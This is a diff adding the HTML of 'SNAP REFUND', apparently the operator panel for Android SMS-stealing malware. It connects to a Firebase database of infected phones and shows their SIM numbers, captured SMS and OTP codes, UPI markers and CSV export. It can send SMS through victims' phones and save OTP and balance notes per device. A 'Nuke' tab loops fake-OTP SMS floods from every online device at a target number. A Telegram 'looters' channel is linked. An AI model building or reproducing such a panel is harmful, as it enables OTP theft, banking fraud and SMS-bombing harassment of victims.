@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SNAP REFUND</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div id="otpBar"><div class="otp-lbl">OTP</div><div class="otp-num" id="otpNum" onclick="otpCopy()">──────</div><div class="otp-src" id="otpSrc"></div><button class="otp-cpbtn" onclick="otpCopy()">Copy</button><button class="otp-x" onclick="otpDismiss()">✕</button></div>
+
+<div id="setup" style="display:flex">
+  <div class="orb o1"></div><div class="orb o2"></div>
+  <div class="setup-card">
+    <div class="tg-top-link">
+      <a href="https://t.me/pannellooters" target="_blank" rel="noopener" class="tg-link-top">
+        <svg width="15" height="15" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="tgTopBg" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#2AABEE"></stop><stop offset="1" stop-color="#229ED9"></stop>
+            </linearGradient>
+          </defs>
+          <circle cx="120" cy="120" r="120" fill="url(#tgTopBg)"></circle>
+          <path d="M98 148l-4 35 22-21 27 20 43-140L50 125l48 23z" fill="white"></path>
+          <path d="M94 148l4 35 5-30" fill="#C8DAEA"></path>
+          <path d="M94 148l50-32-39 42" fill="#a9c9dd"></path>
+        </svg>
+        <span>Join our Community</span>
+        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7v10"></path></svg>
+      </a>
+    </div>
+    <div class="dragon-stage">
+      <!-- cyber particles -->
+      <div class="cp" style="left:32%;bottom:30%;background:#00ffff;--dur:2.1s;--del:0s;--dx:-16px;width:3px;height:3px;border-radius:0;opacity:.7;"></div>
+      <div class="cp" style="left:68%;bottom:35%;background:#bf00ff;--dur:2.4s;--del:.4s;--dx:14px;width:3px;height:3px;border-radius:0;opacity:.7;"></div>
+      <div class="cp" style="left:50%;bottom:50%;background:#ff00ff;--dur:1.8s;--del:.8s;--dx:10px;width:2px;height:2px;border-radius:0;opacity:.6;"></div>
+      <div class="cp" style="left:40%;bottom:42%;background:#00ffff;--dur:2.6s;--del:1.1s;--dx:-12px;width:2px;height:2px;border-radius:0;opacity:.6;"></div>
+      <div class="cp" style="left:62%;bottom:28%;background:#7700ff;--dur:2s;--del:1.5s;--dx:8px;width:3px;height:3px;border-radius:0;opacity:.65;"></div>
+      <div class="dragon-wrap" onclick="dragonClick()">
+        <svg class="dragon-svg" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <!-- grid pattern -->
+            <pattern id="cpGrid" width="18" height="18" patternUnits="userSpaceOnUse">
+              <path d="M 18 0 L 0 0 0 18" fill="none" stroke="rgba(0,255,255,0.07)" stroke-width="0.5"></path>
+            </pattern>
+            <!-- animated neon gradient along stroke -->
+            <linearGradient id="neonA" x1="0%" y1="0%" x2="100%" y2="0%" gradientUnits="userSpaceOnUse">
+              <stop offset="0%">
+                <animate attributeName="stop-color" values="#00ffff;#bf00ff;#ff00ff;#00ffff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+              <stop offset="33%">
+                <animate attributeName="stop-color" values="#bf00ff;#ff00ff;#00ffff;#bf00ff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+              <stop offset="66%">
+                <animate attributeName="stop-color" values="#ff00ff;#00ffff;#bf00ff;#ff00ff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+              <stop offset="100%">
+                <animate attributeName="stop-color" values="#00ffff;#bf00ff;#ff00ff;#00ffff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+            </linearGradient>
+            <linearGradient id="neonB" x1="0%" y1="0%" x2="100%" y2="0%" gradientUnits="userSpaceOnUse">
+              <stop offset="0%">
+                <animate attributeName="stop-color" values="#ff00ff;#00ffff;#bf00ff;#ff00ff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+              <stop offset="50%">
+                <animate attributeName="stop-color" values="#00ffff;#bf00ff;#ff00ff;#00ffff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+              <stop offset="100%">
+                <animate attributeName="stop-color" values="#bf00ff;#ff00ff;#00ffff;#bf00ff" dur="3s" repeatCount="indefinite"></animate>
+              </stop>
+            </linearGradient>
+            <!-- glow filter -->
+            <filter id="nGlow" x="-60%" y="-60%" width="220%" height="220%">
+              <feGaussianBlur in="SourceGraphic" stdDeviation="5" result="b1"></feGaussianBlur>
+              <feGaussianBlur in="SourceGraphic" stdDeviation="12" result="b2"></feGaussianBlur>
+              <feMerge><feMergeNode in="b2"></feMergeNode><feMergeNode in="b1"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge>
+            </filter>
+            <!-- soft outer halo -->
+            <filter id="halo" x="-80%" y="-80%" width="260%" height="260%">
+              <feGaussianBlur in="SourceGraphic" stdDeviation="18" result="blur"></feGaussianBlur>
+              <feMerge><feMergeNode in="blur"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge>
+            </filter>
+            <!-- spark dot glow -->
+            <filter id="spark" x="-200%" y="-200%" width="500%" height="500%">
+              <feGaussianBlur in="SourceGraphic" stdDeviation="3" result="b"></feGaussianBlur>
+              <feMerge><feMergeNode in="b"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge>
+            </filter>
+          </defs>
+
+          <!-- dark circle bg -->
+          <circle cx="110" cy="110" r="107" fill="#04060e" stroke="rgba(0,255,255,0.12)" stroke-width="1"></circle>
+
+          <!-- grid overlay clipped to circle -->
+          <clipPath id="circClip"><circle cx="110" cy="110" r="107"></circle></clipPath>
+          <rect width="220" height="220" fill="url(#cpGrid)" clip-path="url(#circClip)"></rect>
+
+          <!-- scanlines -->
+          <rect width="220" height="220" fill="none" clip-path="url(#circClip)" style="background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,255,0.025) 3px,rgba(0,255,255,0.025) 4px)"></rect>
+
+          <!-- corner accent marks -->
+          <line x1="18" y1="50" x2="18" y2="35" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="18" y1="35" x2="33" y2="35" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="202" y1="50" x2="202" y2="35" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="202" y1="35" x2="187" y2="35" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="18" y1="170" x2="18" y2="185" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="18" y1="185" x2="33" y2="185" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="202" y1="170" x2="202" y2="185" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+          <line x1="202" y1="185" x2="187" y2="185" stroke="rgba(0,255,255,0.35)" stroke-width="1.5"></line>
+
+          <!-- ∞ — outer halo (very thick, very low opacity) -->
+          <path d="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z" fill="none" stroke="rgba(0,255,255,0.08)" stroke-width="32" stroke-linecap="round" filter="url(#halo)"></path>
+
+          <!-- ∞ — mid glow layer -->
+          <path d="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z" fill="none" stroke="url(#neonB)" stroke-width="18" stroke-linecap="round" opacity="0.18"></path>
+
+          <!-- ∞ — secondary bright -->
+          <path d="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z" fill="none" stroke="url(#neonA)" stroke-width="8" stroke-linecap="round" opacity="0.55" filter="url(#nGlow)"></path>
+
+          <!-- ∞ — main bright stroke -->
+          <path d="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z" fill="none" stroke="url(#neonA)" stroke-width="3.5" stroke-linecap="round" filter="url(#nGlow)"></path>
+
+          <!-- moving spark dot -->
+          <circle r="5" fill="#ffffff" filter="url(#spark)" opacity="0.95">
+            <animateMotion dur="2.4s" repeatCount="indefinite" path="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z"></animateMotion>
+          </circle>
+          <!-- trailing spark (offset) -->
+          <circle r="3" opacity="0.6">
+            <animate attributeName="fill" values="#00ffff;#bf00ff;#ff00ff;#00ffff" dur="3s" repeatCount="indefinite"></animate>
+            <animateMotion dur="2.4s" begin="-0.4s" repeatCount="indefinite" path="M 110,110 C 90,58 12,58 12,110 C 12,162 90,162 110,110 C 130,58 208,58 208,110 C 208,162 130,162 110,110 Z"></animateMotion>
+          </circle>
+
+          <!-- center node -->
+          <circle cx="110" cy="110" r="5" fill="#0a0e1a" stroke="rgba(0,255,255,0.7)" stroke-width="1.5"></circle>
+          <circle cx="110" cy="110" r="2.5">
+            <animate attributeName="fill" values="#00ffff;#bf00ff;#ff00ff;#00ffff" dur="3s" repeatCount="indefinite"></animate>
+          </circle>
+
+          <!-- outer ring -->
+          <circle cx="110" cy="110" r="105" fill="none" stroke="rgba(0,255,255,0.06)" stroke-width="1" stroke-dasharray="4 8"></circle>
+        </svg>
+      </div>
+    </div>
+        <div class="mode-toggle">
+      <button class="mode-btn active" id="modeDesktop" onclick="setMode('desktop')">🖥 Desktop</button>
+      <button class="mode-btn" id="modeMobile" onclick="setMode('mobile')">📱 Mobile</button>
+    </div>
+    <div class="setup-eyebrow">SNAP REFUND</div>
+    <div class="setup-h"><span class="gold-word">SNAP</span> REFUND</div>
+    <div class="setup-sub">Connect your Firebase database to start monitoring devices in real-time</div>
+    <label class="fl">Firebase Database URL</label>
+    <input id="fbUrl" class="fi" placeholder="https://project.firebaseio.com" type="url">
+    <label class="fl" style="margin-top:2px">Auth Key / Database Secret</label>
+    <input id="fbKey" class="fi" placeholder="Firebase database secret key" type="text">
+    <div id="fl_formWrap"><button type="button" class="cta" onclick="rippleClick(event);flConnect()">🔥 Connect to Firebase →</button></div>
+    <div class="s-err" id="serr">Connection failed — check URL and key</div>
+    <div class="s-footer"><span class="gold-grad">SNAP REFUND</span></div>  </div>
+</div>
+
+<div id="panel">
+  <div class="tb">
+    <div class="tb-dots"><div class="td td-r" onclick="disconnect()" title="Disconnect"></div><div class="td td-y"></div><div class="td td-g"></div></div>
+    <div class="tb-logo"><span class="tb-gl">SNAP REFUND</span></div>
+    <div class="tb-pills"><span class="pill p-t" id="tpTot">—</span><span class="pill p-on" id="tpOn">—</span><span class="pill p-off" id="tpOff">—</span></div>
+    <div class="live-dot"></div>
+    <button class="tb-btn" onclick="loadDevs()" title="Refresh">↻ Refresh</button>
+    <button class="tb-btn" onclick="toggleSB()" title="Sidebar">☰</button>
+    <button class="tb-btn" onclick="cycleFont()" title="Font Size">Aa</button>
+    <button class="tb-btn" onclick="openM('bulkModal')" style="color:var(--mint)">BULK</button>
+    <button class="tb-btn" onclick="exportAllMsgs()" style="color:var(--gold)">CSV</button>
+    <button class="tb-btn" id="apBtn" onclick="autoPinAll()" style="color:var(--lilac)">PING</button><button class="tb-btn" onclick="flLogout()" style="color:var(--rose)">⏏ Logout</button>
+  </div>
+  <div class="body">
+    <div class="sb">
+      <div class="sb-search"><div class="sb-sbox"><span style="color:var(--dim)">◉</span><input id="sbSearch" placeholder="Search devices..." oninput="renderSB()"></div></div>
+      <div class="sb-filters">
+        <button class="sbf fa" id="sfAll" onclick="setSF('all')">All</button>
+        <button class="sbf" id="sfOn" onclick="setSF('online')">🟢</button>
+        <button class="sbf" id="sfOff" onclick="setSF('offline')">🔴</button>
+        <button class="sbf" id="sfPin" onclick="setSF('pin')">💳</button>
+      </div>
+      <div class="sb-list" id="sbList"><div class="ldwrap"><div class="gold-spin"></div> Loading...</div></div>
+      <div class="sb-footer">
+        <button class="sfbtn" onclick="openM('addModal')">＋</button>
+        <button class="sfbtn" onclick="openM('updModal')">✎</button>
+        <button class="sfbtn del" onclick="delOff()">🗑</button>
+      </div>
+      <div class="sb-brand"><span class="gold-grad">SNAP REFUND</span></div>
+    </div>
+    <div class="main">
+      <div class="tabs">
+        <div class="tab" onclick="switchTab('overview')">📊 Overview</div>
+        <div class="tab" onclick="switchTab('detail')">📱 Device</div>
+        <div class="tab active" onclick="switchTab('messages')">💬 Messages</div>
+        <div class="tab" onclick="switchTab('sendsms')">📡 Send SMS</div>
+        <div class="tab" onclick="switchTab('allmsgs')">📋 All Messages</div>
+        <div class="tab" onclick="switchTab('nuke')">💣 Nuke</div>
+      </div>
+      <div class="tab-body">
+
+        <div class="pane" id="pane-overview">
+          <div class="ov-banner">
+            <svg class="ov-mini-dragon" viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg"><defs><radialGradient id="dBodM" cx="40%" cy="30%"><stop offset="0%" stop-color="#1a0603"></stop><stop offset="55%" stop-color="#0f0301"></stop><stop offset="100%" stop-color="#070100"></stop></radialGradient><radialGradient id="dBod2M" cx="55%" cy="40%"><stop offset="0%" stop-color="#1a0703"></stop><stop offset="100%" stop-color="#070100"></stop></radialGradient><radialGradient id="dEyeLM" cx="35%" cy="35%"><stop offset="0%" stop-color="#ffcc00"></stop><stop offset="45%" stop-color="#ff6600"></stop><stop offset="100%" stop-color="#1a0500"></stop></radialGradient><radialGradient id="dEyeRM" cx="35%" cy="35%"><stop offset="0%" stop-color="#ff9900"></stop><stop offset="50%" stop-color="#cc3300"></stop><stop offset="100%" stop-color="#1a0200"></stop></radialGradient><radialGradient id="dHornM" cx="40%" cy="30%"><stop offset="0%" stop-color="#ff6b00"></stop><stop offset="100%" stop-color="#660000"></stop></radialGradient><filter id="dglowM" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="2.5" result="b"></feGaussianBlur><feMerge><feMergeNode in="b"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge></filter><filter id="dsglowM" x="-40%" y="-40%" width="180%" height="180%"><feGaussianBlur stdDeviation="4" result="b"></feGaussianBlur><feMerge><feMergeNode in="b"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge></filter><linearGradient id="dFlameM" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff2200"></stop><stop offset="50%" stop-color="#ff8800"></stop><stop offset="100%" stop-color="#ffcc00"></stop></linearGradient></defs><ellipse cx="72" cy="112" rx="28" ry="8" fill="rgba(255,80,0,.18)" style="animation:dragonShadow 1.4s ease-in-out infinite"></ellipse><path d="M 100,103 Q 126,87 122,66 Q 118,48 130,35" stroke="rgba(255,120,0,0.75)" stroke-width="6.5" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 103px"></path><path d="M 100,103 Q 126,87 122,66 Q 118,48 130,35" stroke="rgba(255,220,0,0.2)" stroke-width="3" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 103px"></path><ellipse cx="130" cy="32" rx="5" ry="9" fill="url(#dFlameM)" opacity=".85" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 103px" filter="url(#dglowM)"></ellipse><ellipse cx="70" cy="102" rx="30" ry="23" fill="url(#dBod2M)"></ellipse><path d="M 42,40 L 28,6 L 54,32" fill="url(#dHornM)" filter="url(#dglowM)"></path><path d="M 42,40 L 35,14 L 52,32" fill="#ffaa00" opacity=".3"></path><path d="M 98,40 L 112,6 L 86,32" fill="url(#dHornM)" filter="url(#dglowM)"></path><path d="M 98,40 L 105,14 L 88,32" fill="#ffaa00" opacity=".3"></path><circle cx="70" cy="60" r="31" fill="url(#dBodM)"></circle><polygon points="38,38 30,16 54,34" fill="url(#dBodM)"></polygon><polygon points="102,38 110,16 86,34" fill="url(#dBodM)"></polygon><polygon points="40,37 34,20 52,33" fill="rgba(255,120,0,.55)"></polygon><polygon points="100,37 106,20 88,33" fill="rgba(255,120,0,.55)"></polygon><ellipse cx="70" cy="70" rx="13" ry="9" fill="rgba(20,4,1,.75)"></ellipse><g style="animation:eyeBlink 5s infinite;transform-origin:55px 58px"><ellipse cx="55" cy="58" rx="11" ry="12" fill="url(#dEyeLM)" filter="url(#dglowM)"></ellipse><ellipse cx="55" cy="58" rx="11" ry="12" fill="none" stroke="rgba(255,160,0,.65)" stroke-width="1.5"></ellipse><ellipse cx="55" cy="58" rx="3.5" ry="9.5" fill="#1a0200"></ellipse><circle cx="58" cy="53" r="2.8" fill="rgba(255,220,0,.9)"></circle></g><g style="animation:eyeBlink 5s infinite;animation-delay:.07s;transform-origin:85px 58px"><ellipse cx="85" cy="58" rx="11" ry="12" fill="url(#dEyeRM)" filter="url(#dglowM)"></ellipse><ellipse cx="85" cy="58" rx="11" ry="12" fill="none" stroke="rgba(255,100,0,.6)" stroke-width="1.5"></ellipse><ellipse cx="85" cy="58" rx="3.5" ry="9.5" fill="#1a0100"></ellipse><circle cx="88" cy="53" r="2.8" fill="rgba(255,180,0,.85)"></circle></g><path d="M 40,80 Q 16,64 14,42 Q 28,58 42,70" fill="rgba(60,8,0,.55)" stroke="rgba(255,80,0,.28)" stroke-width="1.2"></path><path d="M 100,80 Q 124,64 126,42 Q 112,58 98,70" fill="rgba(60,8,0,.55)" stroke="rgba(255,80,0,.28)" stroke-width="1.2"></path><ellipse cx="54" cy="119" rx="9" ry="6" fill="url(#dBod2M)"></ellipse><ellipse cx="86" cy="119" rx="9" ry="6" fill="url(#dBod2M)"></ellipse></svg>
+            <div>
+              <div class="ov-title">✨ <span class="gold-word">Live Dashboard</span></div>
+              <div class="ov-stats">
+                <div class="ov-s tot">Total: <span id="ov-tot">—</span></div>
+                <div class="ov-s on">Online: <span id="ov-on">—</span></div>
+                <div class="ov-s off">Offline: <span id="ov-off">—</span></div>
+                <div class="ov-s pin">UPI: <span id="ov-upi">—</span></div>
+              </div>
+            </div>
+          </div>
+          <div class="stat-grid">
+            <div class="sc sc-g"><div class="sv" id="sv-tot" style="color:var(--gold2)">—</div><div class="sl">Total Devices</div></div>
+            <div class="sc sc-a"><div class="sv" id="sv-on" style="color:var(--mint)">—</div><div class="sl">Online</div></div>
+            <div class="sc sc-r"><div class="sv" id="sv-off" style="color:var(--rose)">—</div><div class="sl">Offline</div></div>
+            <div class="sc sc-p"><div class="sv" id="sv-sim" style="color:var(--lilac)">—</div><div class="sl">SIMs</div></div>
+          </div>
+          <div class="sec-hdr">Devices — Newest First</div>
+          <div class="tbl-wrap" id="ovTable"><div class="ldwrap"><div class="gold-spin"></div> Loading...</div></div>
+        </div>
+
+        <div class="pane" id="pane-detail">
+          <div class="ph" id="detPH"><div class="pi">📱</div><p>Select a device from the sidebar</p></div>
+          <div id="detCont" style="display:none"></div>
+        </div>
+
+        <div class="pane active" id="pane-messages">
+          <div id="msgNoDev" class="no-dev"><div class="ei">💬</div><p>Select a device to view messages</p></div>
+          <div id="msgCont" style="display:none">
+            <div class="msg-top">
+              <div style="display:flex;align-items:center;gap:10px"><div class="msg-dn" id="msgDevN">Messages</div><div class="msg-cnt" id="msgCnt">0</div></div>
+              <div style="display:flex;align-items:center;gap:8px">
+                <button class="mbtn" id="mrefBtn" onclick="refreshMsgs()">↻ Refresh</button>
+                <button class="mbtn" onclick="showRaw()" style="color:var(--gold);border-color:rgba(255,148,0,.3)">🔍 Raw</button>
+                <button class="mbtn" onclick="exportDevMsgs()" style="color:var(--mint);border-color:rgba(0,212,170,.3)">⬇ CSV</button>
+                <!-- ★ NEW: Delete All Messages button -->
+                <button class="mbtn-del-all" onclick="confirmDelAllMsgs()" title="Delete ALL messages for this device">🗑 Delete All</button>
+                <div class="live-b"><div class="ld"></div> Live</div>
+              </div>
+            </div>
+            <div class="simbar">
+              <div class="ms-sim"><div class="ms-dot s1"></div><div class="ms-info"><div class="ms-lbl">SIM 1</div><div class="ms-num" id="ms1n">—</div><div class="ms-car" id="ms1c">—</div></div><button class="ms-cp" id="mcp1" onclick="cpSim(1)">Copy</button></div>
+              <div class="ms-div"></div>
+              <div class="ms-sim"><div class="ms-dot s2"></div><div class="ms-info"><div class="ms-lbl">SIM 2</div><div class="ms-num" id="ms2n">—</div><div class="ms-car" id="ms2c">—</div></div><button class="ms-cp" id="mcp2" onclick="cpSim(2)">Copy</button></div>
+            </div>
+            <div id="rawView"></div>
+            <div class="msg-bar">
+              <div class="sbox"><span style="color:var(--dim)">◉</span><input id="msgSrch" placeholder="Search messages..." oninput="filterMsgs()"></div>
+              <button class="mfb ma" id="mf-all" onclick="setMF('all')">All</button>
+              <button class="mfb" id="mf-incoming" onclick="setMF('incoming')">In</button>
+              <button class="mfb" id="mf-outgoing" onclick="setMF('outgoing')">Out</button>
+            </div>
+            <div id="msgList" class="msg-list"></div>
+          </div>
+        </div>
+
+        <div class="pane" id="pane-sendsms">
+          <div class="sw"><div class="sc2">
+            <div class="sc2-t">📡 Send SMS</div>
+            <div class="sc2-s">Route a message through any connected device</div>
+            <div class="ddisp" id="devDisp"><div style="width:9px;height:9px;border-radius:50%;flex-shrink:0;background:var(--dim);">&nbsp;</div><div><div class="dd-name">No device selected</div><div class="dd-id">Pick from sidebar</div></div></div>
+            <div class="sim-tog">
+              <div class="sim-col"><button class="stb s1" id="sb1" onclick="selSim(1)">SIM 1</button><div class="snrow"><span class="sntxt" id="sn1">—</span><button class="cpb" id="cp1" onclick="cpSN(1)">Copy</button></div></div>
+              <div class="sim-col"><button class="stb" id="sb2" onclick="selSim(2)">SIM 2</button><div class="snrow"><span class="sntxt" id="sn2">—</span><button class="cpb" id="cp2" onclick="cpSN(2)">Copy</button></div></div>
+            </div>
+            <div class="otp-note-box" id="otpNoteBox">
+              <div class="otp-note-lbl">💳 OTP Note (saved per device)</div>
+              <div class="otp-note-disp empty" id="otpNoteDisp">No OTP note saved yet…</div>
+              <div class="otp-note-row">
+                <input class="otp-note-inp" id="otpNoteInp" placeholder="Paste OTP, balance, anything…">
+                <button class="otp-note-save" onclick="saveOtpNote()">Save</button>
+              </div>
+            </div>
+            <label class="fl">To (Phone Number)</label><input id="sTo" class="sinp" placeholder="+91 9876543210">
+            <label class="fl" style="margin-top:3px">Message</label><textarea id="sMsg" class="sarea" placeholder="Type your message..."></textarea>
+            <button class="sbtn" id="sBtn" onclick="sendSms()">🚀 Send Message</button>
+            <div class="sres" id="sRes"></div>
+          </div></div>
+        </div>
+
+        <div class="pane" id="pane-allmsgs">
+          <div class="msg-top">
+            <div style="display:flex;align-items:center;gap:10px"><div class="msg-dn">📋 All Messages</div><div class="msg-cnt" id="amCnt">—</div></div>
+            <div style="display:flex;align-items:center;gap:8px"><button class="mbtn" onclick="trigAM(true)">↻ Refresh All</button><div class="live-b"><div class="ld"></div> Live</div></div>
+          </div>
+          <div id="apWrap" style="display:none"><div class="ap-txt" id="apTxt">Loading...</div><div class="ap-bar"><div class="ap-fill" id="apFill" style="width:0%"></div></div></div>
+          <div class="msg-bar">
+            <div class="sbox"><span style="color:var(--dim)">◉</span><input id="amSearch" placeholder="Search message, sender, device, note..." oninput="filterAndRender()"></div>
+            <button class="mfb ma" id="amf-all" onclick="setAMF('all')">All</button>
+            <button class="mfb" id="amf-incoming" onclick="setAMF('incoming')">In</button>
+            <button class="mfb" id="amf-outgoing" onclick="setAMF('outgoing')">Out</button>
+          </div>
+          <div id="amWrap" style="overflow-y:auto;height:calc(100vh - 290px);">
+            <div class="am-scroll" id="amList"></div>
+            <div id="amSentinel" style="height:40px;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:12px;"></div>
+          </div>
+        </div>
+
+        <div class="pane" id="pane-nuke">
+          <div class="nuke-card">
+            <div style="display:flex;align-items:center;gap:14px;margin-bottom:22px">
+              <div style="font-size:44px;animation:float 2s ease-in-out infinite">💣</div>
+              <div style="flex:1">
+                <div style="font-size:22px;font-weight:900;color:var(--rose);letter-spacing:-.3px">Nuke</div>
+                <div style="font-size:12px;color:var(--sub);margin-top:3px">Fires from ALL online devices simultaneously — loops until stopped</div>
+              </div>
+              <div id="nukeLiveBadge" style="display:none;align-items:center;gap:6px;background:rgba(255,107,107,.12);border:1px solid rgba(255,107,107,.3);padding:6px 14px;border-radius:20px;font-size:11px;font-weight:700;color:var(--rose)">
+                <span style="width:8px;height:8px;border-radius:50%;background:var(--rose);animation:pulse 1s infinite;display:inline-block"></span>
+                NUKING
+              </div>
+            </div>
+            <label class="fl">Target Number</label>
+            <input id="nukeTarget" class="nuke-inp" placeholder="+91 9876543210">
+            <label class="fl">SIM Slot</label>
+            <div style="display:flex;gap:9px;margin-bottom:14px">
+              <button id="nukeSim1Btn" class="nuke-sim-btn nuke-sim-s1" onclick="nukeSetSim(1)">SIM 1</button>
+              <button id="nukeSim2Btn" class="nuke-sim-btn nuke-sim-s2" onclick="nukeSetSim(2)">SIM 2</button>
+            </div>
+            <label class="fl">Message Mode</label>
+            <div style="display:flex;gap:8px;margin-bottom:12px">
+              <button id="nukeModeRandom" onclick="nukeSetMode('random')" style="flex:1;padding:10px;background:rgba(192,132,252,.18);border:1px solid rgba(192,132,252,.4);border-radius:10px;color:var(--lilac);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:800;cursor:pointer">🎲 Random OTP</button>
+              <button id="nukeModeCustom" onclick="nukeSetMode('custom')" style="flex:1;padding:10px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:700;cursor:pointer">✎ Custom</button>
+            </div>
+            <div id="nukeRandomPreviewBox" style="background:rgba(192,132,252,.06);border:1px solid rgba(192,132,252,.2);border-radius:10px;padding:14px;margin-bottom:12px">
+              <div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:8px">Every send will look like this (regenerates each time):</div>
+              <div id="nukePreview" style="font-size:13px;color:var(--gold);font-family:'Share Tech Mono',monospace;line-height:1.6;word-break:break-word"></div>
+              <button onclick="nukeUpdatePreview()" style="margin-top:10px;padding:6px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;cursor:pointer">↻ Preview another</button>
+            </div>
+            <div id="nukeCustomBox" style="display:none;margin-bottom:12px">
+              <textarea id="nukeMsg" class="nuke-area" placeholder="Type your message here..." style="margin-bottom:6px"></textarea>
+              <div style="font-size:11px;color:var(--sub);font-family:'Share Tech Mono',monospace">Preview: <span id="nukeCustomPreview" style="color:var(--gold)"></span></div>
+            </div>
+            <input id="nukeDelay" type="hidden" value="0">
+            <div style="background:rgba(255,148,0,.05);border:1px solid rgba(255,148,0,.1);border-radius:11px;padding:12px 16px;margin-bottom:16px;font-size:13px;color:var(--sub)">
+              <span id="nukeOnlineCnt" style="font-weight:700;color:var(--mint)">0</span> online devices will fire each round
+            </div>
+            <div class="nuke-stat-box" id="nukeStats">
+              <div style="display:flex;gap:20px;flex-wrap:wrap;margin-bottom:12px">
+                <div><div style="font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:4px">Sent</div><div id="nukeSent" style="font-size:40px;font-weight:900;color:var(--mint)">0</div></div>
+                <div><div style="font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:4px">Failed</div><div id="nukeFail" style="font-size:40px;font-weight:900;color:var(--rose)">0</div></div>
+              </div>
+              <div id="nukeLastMsg" style="font-size:11px;color:var(--sub);font-family:'Share Tech Mono',monospace;margin-bottom:10px;line-height:1.5;word-break:break-all"></div>
+              <div class="nuke-log" id="nukeLog"></div>
+            </div>
+            <div style="display:flex;gap:10px">
+              <button id="nukeFireBtn" class="nuke-fire-btn" onclick="nukeStart()">💣 Fire Nuke</button>
+              <button id="nukeStopBtn" class="nuke-stop-btn" onclick="nukeStop()" style="display:none">⏹ Stop</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MODALS -->
+<div class="overlay" id="bulkModal"><div class="modal" style="max-width:480px;width:95%">
+<div class="mt">📡 Bulk SMS</div>
+<div style="display:flex;gap:8px;margin-bottom:10px">
+  <button type="button" onclick="bulkSelOnline()" style="flex:1;padding:8px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;cursor:pointer">Online Only</button>
+  <button type="button" onclick="bulkSelAll2()" style="flex:1;padding:8px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;cursor:pointer">Select All</button>
+  <button type="button" onclick="bulkClear()" style="flex:1;padding:8px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;cursor:pointer">Clear</button>
+</div>
+<div class="bulk-list" id="bulkList"></div>
+<label class="fl">Target Number</label><input class="fi" id="bulkTo" placeholder="+91 9876543210">
+<div style="display:flex;gap:8px;margin-bottom:12px">
+  <button type="button" id="bkSim1" onclick="bkSim(1)" style="flex:1;padding:9px;background:rgba(255,148,0,.15);border:1px solid rgba(255,148,0,.4);border-radius:9px;color:var(--gold2);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:800;cursor:pointer">SIM 1</button>
+  <button type="button" id="bkSim2" onclick="bkSim(2)" style="flex:1;padding:9px;background:var(--bg3);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:12px;cursor:pointer">SIM 2</button>
